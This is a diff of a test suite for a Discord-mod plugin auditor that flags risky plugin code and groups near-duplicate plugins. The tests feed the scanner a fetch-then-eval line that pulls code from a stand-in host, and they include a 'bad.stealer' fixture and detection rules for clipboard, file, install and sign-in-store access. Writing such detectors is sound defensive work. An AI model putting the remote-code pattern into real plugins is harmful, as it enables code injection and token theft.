@@ -92,6 +92,8 @@ const has = (s, rule) => s.findings.some(f => f.rule === rule)
 	const rce = scan('t.rce', 'fetch("https://paste.example.org/a").then(r=>r.text()).then(eval)')
 	check('eval + fetch is "can download and run code"', has(rce, 'code.eval') && rce.combos.some(c => c.id === 'combo.remote-code'), rce.combos)
 	check('reading the clipboard is caught', has(scan('t.c', 'Clipboard.getString().then(s=>s)'), 'device.clipboard'))
+	check('a word that only starts with an action name is not that action (createMessageContent in a log line)', !has(scan('t.fp', "found.chat = 'createMessageContent (the chat rows)'"), 'write.actions') && !has(scan('t.fp2', 'x.sendMessageDraft(1)'), 'write.actions'))
+	check('only naming the sign-in store is low, not a finding worth a look', scan('t.store', 'return valenced.discord.flux.Stores.AuthenticationStore').risk === 'low')
 	check('writing the clipboard is not', !has(scan('t.c2', 'Clipboard.setString("x")'), 'device.clipboard'))
 	check('writing files is caught', has(scan('t.w', 'writeFile(p,d)'), 'device.files'))
 	check('installing plugins is caught', has(scan('t.i', 'confirmInstallFile(token)'), 'plugins.manage'))
@@ -174,6 +176,9 @@ const has = (s, rule) => s.findings.some(f => f.rule === rule)
 	const common = ['x', 'y', 'z', 'w', 'v', 'u'].map(n => plugin(`${n}.p${n}`, big('shared-boilerplate') + big(n), { name: `Plugin ${n}${n}${n}`, description: `unique ${n.repeat(5)} description` }))
 	check('strings that every plugin has do not make plugins look alike', kit.findDuplicates(inputs(common)).length === 0, kit.findDuplicates(inputs(common)))
 	check('plugins without code do not crash it', kit.findDuplicates(inputs([plugin('n.a', null), plugin('n.b', null)])).length === 0)
+	const siblings = ['Themes', 'Themes API', 'Legacy Themes'].map((name, i) => plugin(`valenced.t${i}`, big(`sib${i}`), { name, description: 'Colour packs themes for the app and fonts icons emoji' }))
+	const sib = kit.findDuplicates(inputs(siblings))
+	check('sibling plugins with similar names and descriptions stay a weak (low) group', sib.length === 1 && sib[0].confidence === 'low', sib)
 	check('one plugin is never a group', kit.findDuplicates(inputs([a])).length === 0)
 }
 
@@ -363,7 +368,7 @@ async function pluginTests(real) {
 		const manifest = JSON.parse(fs.readFileSync(path.join(ROOT, 'plugins', 'plugin-auditor', 'manifest.json'), 'utf8'))
 		const cleanups = []
 		const errors = []
-		const self = { manifest: { ...manifest, version: { nums: [1, 0, 0] } }, errors, reportError: e => errors.push(e), requireReload() {}, startedLate: false }
+		const self = { manifest: { ...manifest, version: { nums: [1, 0, 1] } }, errors, reportError: e => errors.push(e), requireReload() {}, startedLate: false }
 		const api = { cleanup: (...fns) => cleanups.push(...fns), decorate() {}, jsonStorage: storage, logger: { log() {}, warn() {}, error() {}, info() {}, debug() {} }, plugin: self, unscoped: runtime.valenced }
 		self.api = api
 		await definition.start.call(self, { ...api, plugin: self })
@@ -611,7 +616,7 @@ async function pluginTests(real) {
 		await view.settle()
 		findNode(view.tree, n => n.type === 'Design.Button' && n.props.text === 'Copy logs').props.onPress()
 		const report = s.copied.at(-1)
-		check('the debug report names the plugin, the phone and Discord', report.startsWith('Plugin Auditor debug report') && report.includes('marklong.plugin-auditor 1.0.0') && report.includes('Discord: 354.5'), report.slice(0, 400))
+		check('the debug report names the plugin, the phone and Discord', report.startsWith('Plugin Auditor debug report') && report.includes('marklong.plugin-auditor 1.0.1') && report.includes('Discord: 354.5'), report.slice(0, 400))
 		check('it shows how the scan went', report.includes('Plugin list: native list') && report.includes('Scanned: 6 plugins, 1 duplicate group(s)') && /Rules: \d+/.test(report) && report.includes('Slowest:'), report)
 		check('it lists every plugin with risk, counts, size and a short hash but no code', /bad\.stealer 1\.0\.0 critical \d+f \d+l \d+ch [0-9a-f]{10}/.test(report) && !report.includes('collector.example.net/t?x'), report)
 		check('it says which plugin Valenced gave no code for', report.includes('No code from Valenced for: empty.nocode'))
